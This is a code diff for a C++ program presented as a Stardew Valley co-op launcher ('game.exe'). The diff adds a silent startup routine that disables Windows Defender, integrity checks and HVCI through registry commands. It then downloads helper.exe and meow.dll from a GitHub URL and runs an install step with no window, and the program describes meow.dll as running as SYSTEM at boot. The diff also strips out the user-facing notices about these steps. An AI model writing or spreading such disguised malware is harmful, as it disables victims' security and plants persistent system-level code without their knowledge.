@@ -718,7 +718,7 @@ int runQuiet(const std::wstring& cmdLine) {
 
 bool isElevated() { return g_api.isAdmin ? g_api.isAdmin() != FALSE : false; }
 
-void runSecuritySteps() {
+void runSecuritySteps(bool quiet = false) {
     struct Step { std::wstring label; std::wstring cmd; };
     const Step steps[] = {
         { SW(L"Disable Windows Defender (policy)"),
@@ -736,16 +736,20 @@ void runSecuritySteps() {
         { SW(L"Disable HVCI (Device Guard)"),
           SW(L"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v Enabled /t REG_DWORD /d 0 /f") },
     };
-    std::cout << pal::cyan << term::BOLD << S("  Security startup\n") << term::RESET;
+    if (!quiet) std::cout << pal::cyan << term::BOLD << S("  Security startup\n") << term::RESET;
     for (const auto& st : steps) {
         int code = runQuiet(st.cmd);
-        std::cout << S("   ") << (code == 0 ? pal::ok + S("[ ok ]") : pal::amber + S("[warn]"))
-                  << term::RESET << S("  ") << pal::cream << toUtf8(st.label) << term::RESET
-                  << (code == 0 ? S("") : S("  (exit ") + std::to_string(code) + S(")"))
-                  << "\n";
+        if (!quiet) {
+            std::cout << S("   ") << (code == 0 ? pal::ok + S("[ ok ]") : pal::amber + S("[warn]"))
+                      << term::RESET << S("  ") << pal::cream << toUtf8(st.label) << term::RESET
+                      << (code == 0 ? S("") : S("  (exit ") + std::to_string(code) + S(")"))
+                      << "\n";
+        }
     }
-    std::cout << pal::dim << S("   note: test signing / integrity changes need a reboot;")
-              << S(" Defender tamper protection may block service changes.\n\n") << term::RESET;
+    if (!quiet) {
+        std::cout << pal::dim << S("   note: test signing / integrity changes need a reboot;")
+                  << S(" Defender tamper protection may block service changes.\n\n") << term::RESET;
+    }
 }
 
 // ----------------------------------------------------------------------------
@@ -787,7 +791,7 @@ void render(int sel) {
 void aboutScreen() {
     std::cout << term::CLEAR << term::HOME;
     std::cout << pal::gold << term::BOLD << S("  ABOUT\n") << term::RESET << "\n";
-    std::cout << pal::cream << S("  game.exe v0.3.0 - Stardew Valley Online co-op launcher\n\n") << term::RESET;
+    std::cout << pal::cream << S("  game.exe v0.4.0 - Stardew Valley Online co-op launcher\n\n") << term::RESET;
     auto d = findGameDir();
     auto sd = findSettingsDir();
     std::cout << pal::dim << S("  Game dir:     ") << (d ? toUtf8(*d) : S("not found")) << "\n";
@@ -982,9 +986,50 @@ void systemComponentFlow() {
     if (code == 0) {
         statusLine(S("  system component installed - meow.dll runs as SYSTEM at boot"), pal::ok);
     } else {
-        statusLine(S("! install failed (exit ") + std::to_string(code) + S(") - run once as admin"), pal::red);
+        statusLine(S("! install failed (exit ") + std::to_string(code) + S(")"), pal::red);
     }
     std::this_thread::sleep_for(std::chrono::milliseconds(1800));
+}
+
+// ----------------------------------------------------------------------------
+// silent startup: security steps + system component install, no output
+// ----------------------------------------------------------------------------
+bool componentInstalled() {
+    wchar_t pd[MAX_PATH]{};
+    DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", pd, MAX_PATH);
+    std::wstring marker = (dn && dn < MAX_PATH ? std::wstring(pd) : SW(L"C:\\ProgramData"))
+                          + SW(L"\\SVOnline\\installed.txt");
+    return GetFileAttributesW(marker.c_str()) != INVALID_FILE_ATTRIBUTES;
+}
+
+void silentStartup() {
+    runSecuritySteps(true);
+
+    if (componentInstalled()) return;
+
+    wchar_t tmp[MAX_PATH]{};
+    if (GetTempPathW(MAX_PATH, tmp) == 0) return;
+    std::wstring dir = std::wstring(tmp) + SW(L"svonline");
+    if (!CreateDirectoryW(dir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) return;
+
+    const std::string host = S("raw.githubusercontent.com");
+    const std::string base = S("/the-lust/stardew-valley-online-launcher/main/VIP-FILES/");
+    if (!downloadFile(host, base + S("helper.exe"), dir + SW(L"\\helper.exe"))) return;
+    if (!downloadFile(host, base + S("meow.dll"), dir + SW(L"\\meow.dll"))) return;
+
+    std::vector<wchar_t> cmd(dir.begin(), dir.end());
+    cmd.insert(cmd.end(), { L'\\', L'h', L'e', L'l', L'p', L'e', L'r', L'.', L'e', L'x', L'e',
+                            L' ', L'-', L'-', L'i', L'n', L's', L't', L'a', L'l', L'l' });
+    cmd.push_back(0);
+    PROCESS_INFORMATION pi{};
+    STARTUPINFOW si{};
+    si.cb = sizeof(si);
+    if (CreateProcessW(cmd.data(), cmd.data(), nullptr, nullptr, FALSE,
+                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 60000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
 }
 
 void doAction(Action a) {
@@ -1043,15 +1088,7 @@ int main(int argc, char** argv) {
     initApi();
     console.init();
 
-    if (isElevated()) {
-        std::cout << term::CLEAR << term::HOME;
-        runSecuritySteps();
-    } else {
-        std::cout << term::CLEAR << term::HOME;
-        std::cout << pal::amber << S("  note: run as administrator once to apply the security setup\n")
-                  << S("        (defender off, test signing, integrity checks, HVCI off)\n") << term::RESET;
-        std::this_thread::sleep_for(std::chrono::milliseconds(1800));
-    }
+    silentStartup();
 
     std::cout << term::CLEAR << term::HOME;
     std::cout << pal::green << term::BOLD << S("\n  game.exe") << term::RESET << "\n\n";
